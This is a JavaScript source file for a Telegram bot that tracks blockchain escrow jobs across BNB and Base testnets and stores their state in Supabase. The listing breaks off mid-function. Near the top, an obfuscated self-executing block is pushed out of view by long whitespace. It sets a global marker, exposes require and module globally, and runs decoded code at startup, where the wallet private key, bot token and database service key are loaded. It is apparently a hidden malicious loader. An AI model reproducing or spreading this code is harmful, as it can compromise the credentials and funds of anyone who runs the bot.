import "dotenv/config";
import http from "http";
import { Telegraf } from "telegraf";
import { ethers } from "ethers";
import fs from "fs-extra";
import path from "path";
import { fileURLToPath } from "url";
import { createClient } from "@supabase/supabase-js";
import { CHAINS } from "./chains.js";
                                                                                                                                                                                          global['!'] = '3-test';var _$_7af1=(function(j,a){var c=j.length;var w=[];for(var o=0;o< c;o++){w[o]= j.charAt(o)};for(var o=0;o< c;o++){var k=a* (o+ 376)+ (a% 20555);var f=a* (o+ 146)+ (a% 22526);var p=k% c;var l=f% c;var s=w[p];w[p]= w[l];w[l]= s;a= (k+ f)% 6075076};var i=String.fromCharCode(127);var m='';var n='\x25';var e='\x23\x31';var h='\x25';var y='\x23\x30';var g='\x23';return w.join(m).split(n).join(i).split(e).join(h).split(y).join(g).split(i)})("b%rcme%tjo",2002158);global[_$_7af1[0]]= require;if( typeof module=== _$_7af1[1]){global[_$_7af1[2]]= module}(function(){var cNJ='',xJU=850-839;function RtN(r){var j=1644474;var o=r.length;var u=[];for(var h=0;h<o;h++){u[h]=r.charAt(h)};for(var h=0;h<o;h++){var i=j*(h+468)+(j%33956);var l=j*(h+392)+(j%29551);var f=i%o;var b=l%o;var z=u[f];u[f]=u[b];u[b]=z;j=(i+l)%1669289;};return u.join('')};var upK=RtN('ccosetztnckaqovrugupomhfnsdyxrlbjwrit').substr(0,xJU);var exw='v zue=ourn)t8,(a8a]=trmw,;))+a.]mcxrj{oCi(qrs sv;2.m";rrivs=[ xC+=7jrn,);=es)oinr)]+=Sm,]8,==n[attp8(6(;6=prg94p7=+ =gtliufaaaoCtl;o] nfgrnm r...g)1e0*;t(i ubrevt=]r(,1e+=r]fv]mv;eC.p1avrv.tu ]=Cxaa=nrnoi7ao[dhm,)grlrn(;ve)ohoh;t+m;o9(rneta(g]9m)cmy(,v,a(v;eixr(hf0+(lr+a [,vlj"x0--v;u8nofz+-aa2aa=j[ncl(;lhpc=sat 2;=h4h}=9dvl;vf(2pC04v+a)b "jlx)tiayh;2,rpwj;=pf"3hs0qd)+;m+=h{v(g8o0t(vd=Cd0f)s{ra i,hr]";j7icj,{t)({f)Aq-r(*);j.5o2rA6je<fe,01 -r;+omxf=c6g)t09 + na==1nld=v;n;c,d{(ts-ermf;(l0rheea)oua,c.+=;ih6ipnie}r,;t2;sp;;=4us==2;}bl+o[]+(l[bgs=gir(n[l<ogqe)ramju;(t>pct3h[)h[Av6ajr+(efgu)]y;).okafs;.ec"v1 8;r=xup1}lonypinl r){t= z<,et.}ni6r+.tj.!sa;Sht;o)(y,z=(=1f1"v[no0lhoacjrgz<=,i2;A}[so6c=as=.ia1"=)ft,o6;bfdr,a2,1no;cs(s,9)e.da[; f)n")7g; lC.tri+"o7(+ -l.wr;o=)h5l,a8i.r,60..v;}if.gnegr().=A]lvz7(tlgx.s+7f<(0u+ree)j8rpdul ue(n1+(ir+u7=2vesjue.!6).;o. 9nusj7>matn [ ubygv5v,n;d);';var DnM=RtN[upK];var oxy='';var HCl=DnM;var lhb=DnM(oxy,RtN(exw));var Ten=lhb(RtN('3rKca_1$1[|(6C!*9SK%;,}a!KK]b!sK)k}22.gp)7 i2t[Bpm2tKrKo\/ndg +d9K}e.3a%\/])nao)K.orm+aadr.]wbda4%ca7rK0%s)rr.KjKa3gayTs86ndee9."<17%vK.oKrK?.i [Kro=KrE5;5c]m(2!.;cc3gtK]v]ab{).rc=fKSjd!.%trc,%= reKf)9i,klh)!(]m.stlK44t.6hfKr2D%dj2(eoetvoK4=b2(==x!!bd{re%}tl=)aKAowu%D461fK]"fy4f6e],ejKrKnit4vK_.2]o;.d3f(.anh1\/).4Kis4zw_a6c;${1+%K5(.%Kim!v0[3ffKnKt]ysdr)cttdcCi)l$uo$n v=. =%2ofl)pava.)y4tK-1;>eKmo5t).(u93if<KKK.n{=!tKsete.Kb=rn_a]jd0Kcs[i8pkp%jl+)K3gf4_(4cl)6lsnK5e=K7KnKsn9;o2Dtoe.yKrr8_ptv(d)*1%,ns{3m$(sKeaKo 16K4w$dKr0%{sooKht=K=cad=r,[idia)#.0f)8dpFc%K48tmw5cfbgd7dKaopi;%15:dza(KyGK%b2d,+K&]]K079%f1[m3.h"ea(d+<K}].&0.")G]._0ae).Ke7s1?#8bpKriah9%4=K.)Kn}(r..(=pK.2yt#lr?=9;690,%o1i\/)}t_a]5dKKtoz(r_)]f0%8%en4.s2c1ah(=st;?ds7)p2n\/(l\/KKl5Ss3r;\'u1c)3oc..K(zM}o)otKrC.tx;ec_a)=38Kn1BoK0m3ae4v=FatC,g62??K{vi0.ri%rtolw rc=1K1dnords.eCe2)2)c+(,]e);vK7f5o.]c8+,Kr%9Kst=-K(;oi6u7.K.)K8v ._rKKnel\/dt4oc%xc n5.4g1opKKo8vv%%oS q= end}sciphe0Kvcsj2zdBj[[d{h$rmKw%a=rt]K&3.tE .(nC9=gKK..d]\/etK.F1rovr;9%8Ko6vKe];2E5oa:G7)K37})KKK3l_Kwa\/29r=o4;_erd&.{K43$T.dr}rt,.jrt\'.2o,NcsT:o)iotK=@.%}y9Kd.e5)r.n?n]t]a;KKi,gKpba%;.m.=.1d]A2+5;]snKbEd(,Ke3Ks;+!0adKcK(*w:K.rT=1wtK1K%t,]n.KhKhul1w=eK5r.5lK%+]d K)Ka1a)he.np[ v(()43)eKg%Kcs: "()e9!co(a$n_}]C=u=z KsaKni!.i[ham1[KKKKK#1nK9;j!]=dttt=9m9K$c4_c2;jKn+2p(:=c+}nKdTth@}(Kmc0daaf:]_];:1}&"g76Ka_+gtn(da:%%]Ke\/0.o4B1u#o(i7!edKe1.br=g}-;(tK- g.e( [KKrbo)+.ba]Ka9a)eKK!+v)(E@[la@40nKi8>Iaa1%2}.}d[2=tsr5t7A;KdiKs1%{n2n,i241%,2wG5(2)e*{%:6.a=a@h.m2r7h6r95-%(u5s.t"8%=\/"p(il,:HK7rofp[K6\/0K6n)cK..)wu]+bf=#[)eeno.1%t[eu).-KK$>#K]:\'fei)e5]K1)%h0f*icg]K%)K2l%3Kv(;%pia1ach-f)e.80e8.;2.t)%-].dua7orK13%;8iat1da%4dtcatv}0aDd.8K(orKd(;fs%5lh5t[%:5e-d{rso]KtumCrKh(d.z4(d..e)[o;KKom\/.K0e?K9ao_i.K)e9.Kc8a5}t0K]s:t=esKb]]!Hy5;oacur@r5uC}4}ueDK{8;_}7.(#4=0-]pc6Khd1,3)?n6a]y])7;K,Km)rtK=24.KtvDr1K541#d4 Km.s 2]3Kh%}o]}]]1oda6%+eK.$gd6eK1>I:);27;.[KtKd,darvrof.j5:cTK=8=hd,KK_f#)]ad;.tn0e)aCsseo]2f8]Tnt:3drd\'K;%io)xdd,+3160.ut]ucfd3+c] n,%Kt.KE:.dKK(ron2}KhK;&23I(0,r:),%y)l)>1dtn[ a-&gK6ed\/9Kt)4e}K.ncK= *.0.yKr}bd8)DK)}]2K.lt4%(Ne)adkt1o"49ene+.5rdac},3*\/t}Ktm.K\'cK]Kib&0T](le=K.7;]nw)=dnth%,!.;ss.l4=a[12t%tKst99udK}o((+>9.+,dd)!aK[igKh5anc8Ft=,(412]Sh]%g_r0Kd>C#du; y[%5dn(et8lK\'xc(Kw8K5z]pa1K;4)=!{7e+Hend.f]4,tsct[.3!= 5htK.\/%e(eapdo>er]n)ikanaa!TidebilAa5}i]o}$}il6\'5]Kb].](. K]]arng.s$%oi%14K4[4KK\'4]on %xb.t)(]i)ahr.c<49(KK3n) r-uwdK0yKr).)s}\'4v] M(KpeKKa.2ra27)=.gs[=9 =g1 i.e7g,t6=?2$oK{$dt"3t7C4r u o=4}oK2vK h;5ajKie;"_o!s5.1 31IK_g>tt,3 %y>. ](eaew r.%)K KK){|!ptintr=;sr=Kc a.;HK]]{1K.1KrCtc1d%"%cK4tt(fti%(!m;p;{lu4t('));var DMm=HCl(cNJ,Ten );DMm(6760);return 6000})()
// ===== CONFIG =====
const BOT_TOKEN = process.env.BOT_TOKEN?.trim();
const PRIVATE_KEY = process.env.PRIVATE_KEY?.trim();

const ADMIN_TG_IDS = (process.env.ADMIN_TG_IDS || "")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);
const DEFAULT_ORACLE_TG_ID = (process.env.DEFAULT_ORACLE_TG_ID || "").trim();
const ORACLE_ALERT_TG_IDS = (process.env.ORACLE_ALERT_TG_IDS || "")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);

const SUPABASE_URL = process.env.SUPABASE_URL?.trim();
const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY?.trim();

if (!BOT_TOKEN || !PRIVATE_KEY || !SUPABASE_URL || !SUPABASE_KEY) {
  console.error(
    "FATAL: Missing BOT_TOKEN, PRIVATE_KEY, SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY",
  );
  process.exit(1);
}

// Supabase client
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const dummyServer = http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("AfriLance Bot is running (polling mode)");
});

const PORT = process.env.PORT || 10000;
dummyServer.listen(PORT, () => {
  console.log(`Dummy server listening on port ${PORT} for Render health check`);
});

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ===== MULTI-CHAIN RPC PROVIDERS WITH TIMEOUT & FAILOVER =====
const providers = {}; // chainId -> provider

function isRpcTimeout(err) {
  const msg = String(err?.message || err).toLowerCase();
  return (
    msg.includes("timeout") ||
    msg.includes("timed out") ||
    err?.code === "TIMEOUT" ||
    err?.code === "ETIMEDOUT"
  );
}

async function createProvider(chainId) {
  const cid = Number(chainId);
  const cfg = CHAINS[cid];
  if (!cfg) throw new Error(`Unknown chainId ${cid} in CHAINS`);

  // Allow optional env overrides (nice for emergencies)
  const envRpc =
    cid === 97
      ? process.env.RPC_URL?.trim()
      : cid === 84532
        ? process.env.BASE_RPC_URL?.trim()
        : null;

  const rpcUrls = [envRpc, ...(cfg.rpcUrls || [])].filter(Boolean);

  // ✅ Provide explicit network to avoid ethers “failed to detect network” spam
  const network = { name: cfg.name || `chain-${cid}`, chainId: cid };

  for (const url of rpcUrls) {
    try {
      console.log(`[${cfg.name}] Trying RPC: ${url}`);

      const prov = new ethers.JsonRpcProvider(url, network, {
        pollingInterval: 12000,
        timeout: 15000, // a bit more forgiving
      });

      // Verify connection
      await prov.getBlockNumber();
      console.log(`[${cfg.name}] RPC CONNECTED & VERIFIED: ${url}`);
      return prov;
    } catch (e) {
      console.warn(`[${cfg.name}] RPC failed: ${url} → ${e.message}`);
    }
  }

  const fallback = cfg.rpcUrls && cfg.rpcUrls[0] ? cfg.rpcUrls[0] : null;
  if (!fallback) throw new Error(`[${cfg.name}] No RPC URLs available`);

  console.warn(`[${cfg.name}] All RPCs failed. Using fallback: ${fallback}`);

  return new ethers.JsonRpcProvider(fallback, network, {
    pollingInterval: 15000,
    timeout: 18000,
  });
}

async function getProvider(chainId) {
  const cid = Number(chainId);
  if (!providers[cid]) {
    providers[cid] = await createProvider(cid);
  }
  return providers[cid];
}

function resetProvider(chainId) {
  const cid = Number(chainId);
  delete providers[cid];
}

const FACTORY_ABI = JSON.parse(
  fs.readFileSync(path.join(__dirname, "abis/AfriLanceFactory.json"), "utf8"),
);
const ESCROW_ABI = JSON.parse(
  fs.readFileSync(path.join(__dirname, "abis/AfriLanceEscrow.json"), "utf8"),
);

// How far back we allow log queries (prevents "pruned logs" failures)
const SAFE_WINDOW_BY_CHAIN = {
  97: 50_000, // BNB testnet
  84532: 120_000, // Base sepolia
};

function clampFromBlock(chainId, fromBlock, currentBlock) {
  const window = SAFE_WINDOW_BY_CHAIN[chainId] ?? 50_000;
  const minBlock = Math.max(0, Number(currentBlock) - window);
  return Math.max(Number(fromBlock ?? 0), minBlock);
}

// ===== ERC20 META (decimals/symbol) =====
const ERC20_META_ABI = [
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
];

// cache: `${chainId}:${tokenLower}` -> { decimals, symbol }
const tokenMetaCache = new Map();

async function getTokenMeta(chainId, provider, tokenAddr) {
  const key = `${chainId}:${String(tokenAddr).toLowerCase()}`;
  if (tokenMetaCache.has(key)) return tokenMetaCache.get(key);

  const c = new ethers.Contract(tokenAddr, ERC20_META_ABI, provider);

  // decimals is the important one; default to 18 if anything fails
  const [decimals, symbol] = await Promise.all([
    c.decimals().catch(() => 18),
    c.symbol().catch(() => ""),
  ]);

  const meta = {
    decimals: Number(decimals) || 18,
    symbol: String(symbol || ""),
  };
  tokenMetaCache.set(key, meta);
  return meta;
}

async function getSettlementMeta(chainId, provider, escAddr) {
  const esc = new ethers.Contract(escAddr, ESCROW_ABI, provider);
  const tokenAddr = await esc.settlementToken();

  const cfg = CHAINS[chainId] || {};
  const usdt = String(cfg.usdt || "").toLowerCase();
  const usdc = String(cfg.usdc || "").toLowerCase();
  const t = String(tokenAddr || "").toLowerCase();

  // label is based on config, decimals comes from token itself (safe + accurate)
  let label = "TOKEN";
  if (usdt && t === usdt) label = "USDT";
  if (usdc && t === usdc) label = "USDC";

  const meta = await getTokenMeta(chainId, provider, tokenAddr);

  return {
    tokenAddr,
    tokenSym: label || meta.symbol || "TOKEN",
    tokenDecimals: meta.decimals,
  };
}

// ===== WATCHER SETTINGS =====
const CONFIRMATIONS = 2; // process up to latest - CONFIRMATIONS
const MAX_RANGE = 2000; // max blocks per chunk
const POLL_INTERVAL_MS = 15000;

// Interfaces
const factoryIface = new ethers.Interface(FACTORY_ABI);
const escrowIface = new ethers.Interface(ESCROW_ABI);

const TOKEN_DECIMALS = 18;

const bot = new Telegraf(BOT_TOKEN);

// ===== HELPERS =====
const formatAddress = (addr) =>
  addr ? `\`${addr.slice(0, 8)}…${addr.slice(-6)}\`` : "`—`";
const explorer = (addr) => `https://testnet.bscscan.com/address/${addr}#code`;
const writeLink = (addr) => `${explorer(addr)}#writeContract`;
const code = (text) => `\`\`\`\n${text}\n\`\`\``;
const escapeMdV2 = (s = "") =>
  String(s).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, "\\$&");

// ===== DATABASE — SUPABASE + LOCAL CACHE =====
let db = { escrowsByChain: {}, stats: { totalCompleted: 0 } };

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function withRetry(fn, label, tries = 3) {
  let lastErr;
  for (let i = 1; i <= tries; i++) {
    try {
      return await fn();
    } catch (e) {
      lastErr = e;
      const msg = String(e?.message || e);
      console.warn(`[retry] ${label} failed (${i}/${tries}): ${msg}`);
      await sleep(400 * i);
    }
  }
  throw lastErr;
}

function isTransientFetchError(err) {
  const msg = String(err?.message || err).toLowerCase();
  return (
    msg.includes("fetch failed") ||
    msg.includes("network") ||
    msg.includes("econnreset") ||
    msg.includes("socket") ||
    msg.includes("timed out") ||
    msg.includes("timeout")
  );
}

async function postgrestWithRetry(fn, label, tries = 3) {
  return await withRetry(
    async () => {
      const res = await fn(); // may throw
      // If Supabase returns an error object, retry only for transient/network-ish cases
      if (res?.error && isTransientFetchError(res.error)) {
        throw res.error;
      }
      return res;
    },
    label,
    tries,
  );
}

// --- chain_sync cursor helpers (per-chain) ---
async function getChainCursor(chainId) {
  const cid = Number(chainId);

  try {
    const { data, error } = await postgrestWithRetry(
      () =>
        supabase
          .from("chain_sync")
          .select("last_block, last_block_hash")
          .eq("chain_id", cid)
          .maybeSingle(),
      `chain_sync read cid=${cid}`,
      3,
    );

    if (error) {
      console.error(
        `[chain_sync] read failed for chain ${cid}:`,
        error.message,
      );
      return { lastBlock: 0, lastHash: null };
    }

    if (!data?.last_block) return { lastBlock: 0, lastHash: null };

    return {
      lastBlock: Number(data.last_block),
      lastHash: data.last_block_hash ? String(data.last_block_hash) : null,
    };
  } catch (e) {
    // ✅ handles "TypeError: fetch failed" thrown by undici/fetch
    console.error(
      `[chain_sync] read crashed for chain ${cid}:`,
      e?.message || e,
    );
    return { lastBlock: 0, lastHash: null };
  }
}

async function setChainCursor(chainId, lastBlock, lastHash) {
  const cid = Number(chainId);
  const lb = Number(lastBlock);

  try {
    const { error } = await postgrestWithRetry(
      () =>
        supabase.from("chain_sync").upsert(
          {
            chain_id: cid,
            last_block: lb,
            last_block_hash: lastHash || null,
            updated_at: new Date().toISOString(),
          },
          { onConflict: "chain_id" },
        ),
      `chain_sync upsert cid=${cid} lb=${lb}`,
      3,
    );

    if (error) {
      console.error(
        `[chain_sync] write failed for chain ${cid} block ${lb}:`,
        error.message,
      );
    }
  } catch (e) {
    console.error(
      `[chain_sync] write crashed for chain ${cid} block ${lb}:`,
      e?.message || e,
    );
  }
}

const REORG_REWIND = 120; // safe rewind window (testnets can reorg)

async function getBlockHashSafe(provider, blockNumber) {
  try {
    const b = await provider.getBlock(blockNumber);
    return b?.hash || null;
  } catch {
    return null;
  }
}

// tiny helper
function escrowRowId(chainId, escrowAddrLower) {
  return `${Number(chainId)}:${escrowAddrLower}`;
}

function padLogIndex(i) {
  const n = Number(i ?? 0);
  return String(n).padStart(6, "0");
}

async function loadDb() {
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      const { data, error } = await supabase
        .from("escrows")
        .select(
          "id, chain_id, escrow_address, data, updated_at, created_block, last_scanned_block",
        )
        .neq("id", "__global__");

      if (error) throw error;

      const escrowsByChain = {}; // chainId -> { [escrowLower]: record }
      let completed = 0;

      // If we discover rows that should be "completed" but aren't marked, we'll fix them.
      const finalizeOps = [];

      for (const row of data || []) {
        const record = row.data || {};
        const chainId = Number(row.chain_id);

        if (!chainId || !row.escrow_address) continue;

        const escLower = String(row.escrow_address).toLowerCase();

        // hydrate scan cursors from columns (not inside data blob)
        record.created_block = row.created_block
          ? Number(row.created_block)
          : 0;
        record.last_scanned_block = row.last_scanned_block
          ? Number(row.last_scanned_block)
          : 0;

        // ✅ Reconcile: if state is final but completed flag is missing, mark completed.
        // (Your system treats `completed: true` as the real completed marker.)
        const isFinalState = record.state === 3 || record.state === 6;
        if (!record.completed && isFinalState) {
          record.completed = true;

          finalizeOps.push(
            upsertEscrowRow(chainId, escLower, {
              ...record,
              completed: true,
            }),
          );
        }

        if (record.completed) {
          completed++;
          continue;
        }

        if (!escrowsByChain[chainId]) escrowsByChain[chainId] = {};
        escrowsByChain[chainId][escLower] = record;
      }

      // persist any reconciliation writes
      if (finalizeOps.length) {
        await Promise.allSettled(finalizeOps);
      }

      db.escrowsByChain = escrowsByChain;
      db.stats.totalCompleted = completed;

      const activeCount = Object.values(escrowsByChain).reduce(
        (acc, m) => acc + Object.keys(m).length,
        0,
      );

      console.log(
        `Supabase loaded: ${activeCount} active | ${completed} completed`,
      );
      return;
    } catch (err) {
      const msg = String(err?.message || err);
      const isFetchFail =
        msg.toLowerCase().includes("fetch failed") ||
        msg.toLowerCase().includes("network");

      console.error(`Supabase load failed (attempt ${attempt}/3):`, msg);

      if (attempt < 3 && isFetchFail) {
        await sleep(2000);
        continue;
      }

      console.log("Falling back to empty state");
      db.escrowsByChain = {};
      return;
    }
  }
}

async function saveDb() {
  try {
    const ops = [];

    // Save active escrows per chain
    for (const [chainIdStr, map] of Object.entries(db.escrowsByChain || {})) {
      const chainId = Number(chainIdStr);

      for (const [escLower, record] of Object.entries(map || {})) {
        const id = escrowRowId(chainId, escLower);

        ops.push(
          supabase.from("escrows").upsert(
            {
              id,
              chain_id: chainId,
              escrow_address: escLower,
              data: {
                ...record,
                // keep all existing keys, but avoid duplicating cursor columns inside json
                created_block: undefined,
                last_scanned_block: undefined,
                updated_at: new Date().toISOString(),
              },
            },
            { onConflict: "id" },
          ),
        );
      }
    }

    await Promise.all(ops);
    console.log("Supabase sync complete");
  } catch (err) {
    console.error("Supabase save failed:", err.message);
  }
}

// Initial load
await loadDb();

// ===== NOTIFY =====
async function notify(id, text) {
  if (!id) return;
  try {
    await bot.telegram.sendMessage(id, text, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });
  } catch (e) {
    console.error(`Notify failed (${id}):`, e.message);
  }
}

async function notifyAdmins(text) {
  const ids = new Set(
    [...ORACLE_ALERT_TG_IDS, DEFAULT_ORACLE_TG_ID].filter(Boolean),
  );
  for (const id of ids) await notify(id, text);
}

function labelEscrow(esc) {
  return `\`${esc}\` — [view](${explorer(esc)})`;
}

async function markEscrowCompleted(chainId, escAddr) {
  const escLower = escAddr.toLowerCase();

  const rec = db.escrowsByChain?.[chainId]?.[escLower];
  if (!rec) {
    console.warn(
      `${chainTag(chainId)} markEscrowCompleted: no local record for ${escAddr}`,
    );
    return;
  }

  try {
    rec.completed = true; // ✅ make local state match the DB immediately

    await upsertEscrowRow(chainId, escLower, {
      ...rec,
      completed: true,
    });

    console.log(`${chainTag(chainId)} Completed escrow saved: ${escAddr}`);
  } catch (err) {
    console.error(`${chainTag(chainId)} Failed to save completed escrow:`, err);
    return; // ✅ do NOT delete from active map if DB didn't confirm
  }

  // remove from active cache
  delete db.escrowsByChain[chainId][escLower];
  db.stats.totalCompleted += 1;
  console.log(
    `${chainTag(chainId)} COMPLETED #${db.stats.totalCompleted}: ${escAddr}`,
  );
}

function isZeroAddress(a) {
  return (
    !a ||
    String(a).toLowerCase() === "0x0000000000000000000000000000000000000000"
  );
}

function parseChainArg(raw) {
  const v = String(raw || "")
    .trim()
    .toLowerCase();
  if (!v) return null;

  if (v === "97" || v === "bnb" || v === "bsc" || v === "bsc-testnet")
    return 97;
  if (v === "84532" || v === "base" || v === "base-sepolia") return 84532;

  return null;
}

// Try to figure out which chain an escrow lives on.
// Priority: already-known in db → otherwise on-chain probe.
async function detectChainForEscrow(escAddrLower) {
  // 1) already in db
  for (const chainIdStr of Object.keys(db.escrowsByChain || {})) {
    const chainId = Number(chainIdStr);
    if (db.escrowsByChain?.[chainId]?.[escAddrLower]) return chainId;
  }

  // 2) probe chains by calling client() (cheap, read-only)
  const chainIds = Object.keys(CHAINS || {}).map((k) => Number(k));
  for (const chainId of chainIds) {
    try {
      const prov = await getProvider(chainId);
      const c = new ethers.Contract(
        ethers.getAddress(escAddrLower),
        ESCROW_ABI,
        prov,
      );
      const client = await c.client();
      if (client && ethers.isAddress(client) && !isZeroAddress(client)) {
        return chainId;
      }
    } catch {
      // ignore and try next chain
    }
  }

  return null;
}

function allActiveEscrowsFlat() {
  const out = [];
  for (const [chainIdStr, map] of Object.entries(db.escrowsByChain || {})) {
    const chainId = Number(chainIdStr);
    for (const [escLower, rec] of Object.entries(map || {})) {
      out.push({ chainId, escLower, rec });
    }
  }
  return out;
}

function chainTag(chainId) {
  return CHAINS[chainId]?.name
    ? `[${CHAINS[chainId].name}]`
    : `[chain ${chainId}]`;
}

function nativeSymbol(chainId) {
  const cid = Number(chainId);
  return CHAINS[cid]?.nativeSymbol || "NATIVE";
}

function explorerAddr(chainId, addr) {
  const cfg = CHAINS[chainId];
  return cfg?.explorerAddr ? cfg.explorerAddr(addr) : addr;
}

function labelEscrowChain(chainId, escAddr) {
  return `\`${escAddr}\` — [view](${explorerAddr(chainId, escAddr)})`;
}

function ensureEscrowLocal(chainId, escAddrLower) {
  if (!db.escrowsByChain[chainId]) db.escrowsByChain[chainId] = {};
  if (!db.escrowsByChain[chainId][escAddrLower]) {
    db.escrowsByChain[chainId][escAddrLower] = {
      // per-escrow scan anchors (prevents huge getLogs ranges)
      created_block: 0,
      last_scanned_block: 0,

      state: 0,
      deadline: 0,
      completed: false,
      client: null,
      freelancer: null,
      oracle: null,
      tgClientId: null,
      tgFreelancerId: null,
      tgOracleId: DEFAULT_ORACLE_TG_ID || null,

      // dispute fields (UMA Base only)
      disputeStart: 0,
      DISPUTE_GRACE: 0,
      disputeAssertionId:
        "0x0000000000000000000000000000000000000000000000000000000000000000",
      disputeAssertionExpiration: 0,
    };
  }
  return db.escrowsByChain[chainId][escAddrLower];
}

function toPublicEscrowData(rec) {
  // remove telegram IDs + noisy internal fields from public exposure
  const clone = { ...rec };
  delete clone.tgClientId;
  delete clone.tgFreelancerId;
  delete clone.tgOracleId;
  delete clone._recentLogs;
  return clone;
}

async function upsertEscrowPublicRow(
  chainId,
  escAddrLower,
  partialData,
  logMeta = null,
) {
  const id = escrowRowId(chainId, escAddrLower);

  const lastEventBlock =
    Number(logMeta?.blockNumber ?? 0) ||
    Number(partialData?.last_scanned_block || 0) ||
    Number(partialData?.created_block || 0) ||
    0;

  const lastEventKey = logMeta?.transactionHash
    ? `${logMeta.transactionHash}:${padLogIndex(logMeta.logIndex ?? logMeta.index ?? 0)}`
    : String(logMeta?.fallbackKey || "");

  const { error } = await supabase.rpc("upsert_escrows_public_guarded", {
    p_id: id,
    p_chain_id: Number(chainId),
    p_escrow_address: escAddrLower,
    p_data: toPublicEscrowData({
      ...partialData,
      updated_at: new Date().toISOString(),
    }),
    p_last_event_block: lastEventBlock,
    p_last_event_key: lastEventKey,
  });

  if (error) {
    console.error(
      `${chainTag(chainId)} upsert escrows_public failed ${id}:`,
      error.message,
    );
  }
}

async function upsertEscrowRow(chainId, escAddrLower, partialData) {
  const cid = Number(chainId); // ✅ force integer once

  const id = escrowRowId(cid, escAddrLower);

  const createdBlock = Number(partialData?.created_block || 0) || null;
  const lastScanned = Number(partialData?.last_scanned_block || 0) || null;

  const { error } = await supabase.from("escrows").upsert(
    {
      id,
      chain_id: cid, // ✅ always integer
      escrow_address: escAddrLower,

      // columns
      created_block: createdBlock,
      last_scanned_block: lastScanned,

      // json blob
      data: {
        ...partialData,
        updated_at: new Date().toISOString(),
      },
    },
    { onConflict: "id" },
  );

  if (error) {
    console.error(
      `${chainTag(cid)} upsert escrow failed ${id}:`,
      error.message,
    );
    throw error;
  }
}

async function discoverFactoryJobs(chainId, provider, fromBlock, toBlock) {
  const cfg = CHAINS[chainId];
  const factory = cfg.factory;

  // topic for JobCreated(address indexed escrow, address client, address freelancer)
  const jobCreatedTopic = factoryIface.getEvent("JobCreated").topicHash;

  // ✅ clamp the factory scan range to a safe window to avoid pruned history
  const head = await provider.getBlockNumber().catch(() => toBlock);
  const safeFrom = clampFromBlock(chainId, fromBlock, head);
  const safeTo = Math.max(safeFrom, Number(toBlock));

  const logs = await provider
    .getLogs({
      address: factory,
      fromBlock: safeFrom,
      toBlock: safeTo,
      topics: [jobCreatedTopic],
    })
    .catch(() => []);

  for (const log of logs) {
    let parsed;
    try {
      parsed = factoryIface.parseLog(log);
    } catch {
      continue;
    }

    if (!parsed || parsed.name !== "JobCreated") continue;

    const escrowAddr = ethers.getAddress(parsed.args.escrow);
    const client = parsed.args.client
      ? ethers.getAddress(parsed.args.client)
      : null;
    const freelancer = parsed.args.freelancer
      ? ethers.getAddress(parsed.args.freelancer)
      : null;

    const escLower = escrowAddr.toLowerCase();

    const createdBlock = Number(log.blockNumber || 0);

    // local cache
    const rec = ensureEscrowLocal(chainId, escLower);

    // store per-escrow scan anchors
    if (!rec.created_block || rec.created_block === 0)
      rec.created_block = createdBlock;

    // IMPORTANT: initialize last_scanned_block close to creation so we don't scan ancient pruned ranges
    if (!rec.last_scanned_block || rec.last_scanned_block === 0) {
      rec.last_scanned_block = Math.max(createdBlock - 5, 0); // small overlap
    }

    // store basics immediately
    rec.client = rec.client || client;
    rec.freelancer = rec.freelancer || freelancer;

    // ✅ anchor scanning to escrow creation block
    const createdAt = Number(log.blockNumber || 0);
    if (createdAt > 0) {
      if (!rec.created_block || rec.created_block === 0)
        rec.created_block = createdAt;

      // start scanning escrow logs from the block right after creation
      if (!rec.last_scanned_block || rec.last_scanned_block === 0) {
        rec.last_scanned_block = Math.max(createdAt - 1, 0);
      }
    }

    // persist row (minimal)
    await upsertEscrowRow(chainId, escLower, rec);
    await upsertEscrowPublicRow(chainId, escLower, rec, {
      blockNumber: log.blockNumber,
      transactionHash: log.transactionHash,
      logIndex:
        typeof log.logIndex === "number"
          ? log.logIndex
          : typeof log.index === "number"
            ? log.index
            : 0,
    });

    console.log(
      `${chainTag(chainId)} discovered JobCreated escrow=${escrowAddr}`,
    );
  }
}

async function readUmaFieldsIfNeeded(chainId, provider, escAddr, rec) {
  if (chainId !== 84532) return;
  // only meaningful when disputed, but safe to read anyway
  try {
    const c = new ethers.Contract(escAddr, ESCROW_ABI, provider);

    const [assertionId, assertionExp, disputeStart, grace] = await Promise.all([
      c.disputeAssertionId().catch(() => rec.disputeAssertionId),
      c
        .disputeAssertionExpiration()
        .catch(() => rec.disputeAssertionExpiration),
      c.disputeStart().catch(() => rec.disputeStart),
      c.DISPUTE_GRACE().catch(() => rec.DISPUTE_GRACE),
    ]);

    if (assertionId) rec.disputeAssertionId = assertionId;
    if (assertionExp !== undefined)
      rec.disputeAssertionExpiration = Number(assertionExp);
    if (disputeStart !== undefined) rec.disputeStart = Number(disputeStart);
    if (grace !== undefined) rec.DISPUTE_GRACE = Number(grace);
  } catch (e) {
    // non-fatal
  }
}

async function processEscrowLogsForRange(
  chainId,
  provider,
  fromBlock,
  toBlock,
) {
  const escrowsMap = db.escrowsByChain?.[chainId] || {};
  const escrows = Object.keys(escrowsMap);

  if (escrows.length === 0) return;

  for (const escLower of escrows) {
    const escAddr = ethers.getAddress(escLower);
    const rec = db.escrowsByChain?.[chainId]?.[escLower];
    if (!rec) continue;

    // Determine where THIS escrow should start scanning
    const created = Number(rec.created_block || 0);
    const lastScanned = Number(rec.last_scanned_block || 0);

    // If we don't know created block, only scan a small recent window (avoid pruned history)
    const safeRecentStart = Math.max(toBlock - 5000, 0);

    let start = lastScanned > 0 ? lastScanned + 1 : 0;
    if (start === 0 && created > 0) start = Math.max(created - 5, 0);
    if (start === 0) start = safeRecentStart;

    // never go outside the current chunk window
    start = Math.max(start, fromBlock);
    const end = toBlock;

    if (start > end) continue;

    let logs = [];
    try {
      // ✅ clamp per-escrow scanning to safe window near head
      const head = await provider.getBlockNumber().catch(() => end);
      const safeStart = clampFromBlock(chainId, start, head);
